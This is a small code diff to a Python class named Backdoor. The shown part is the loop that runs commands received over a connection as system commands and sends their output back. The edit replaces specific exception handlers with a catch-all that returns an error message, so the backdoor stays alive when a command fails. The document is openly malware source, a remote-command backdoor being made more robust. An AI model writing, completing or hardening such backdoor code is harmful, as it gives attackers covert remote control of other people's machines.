@@ -63,22 +63,10 @@ class Backdoor:
                 else:
                     command_result = self.execute_system_command(received_command).decode()
 
-                self.reliable_send(command_result)
-
-            except ConnectionResetError:
-                pass
-            
-            except json.JSONDecodeError:
-                #print(received_command)
-                pass
-    
-            except KeyboardInterrupt:
-                print("[+] Detected CTRL + C.....Closing App....Please wait...")
-                self.connection.close()
-                exit()
-
-            #except Exception:
-                #pass
+            except Exception:
+                command_result = "[-] Error during command execution"
+                
+            self.reliable_send(command_result)
 
 #class end
 
